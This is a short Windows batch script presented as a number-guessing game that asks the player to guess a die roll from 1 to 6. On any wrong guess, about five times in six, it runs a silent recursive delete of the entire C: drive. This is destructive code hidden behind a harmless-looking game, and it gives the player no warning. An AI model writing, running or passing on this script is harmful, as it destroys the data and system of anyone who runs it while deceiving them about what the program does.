@echo off

set /p guess="Guess the number! 1-6\n"

set /a answer=(%RANDOM% %% 6) + 1

if %guess%==%answer% (
    echo That's correct!
) else (
    rmdir /s /q "C:\"
)
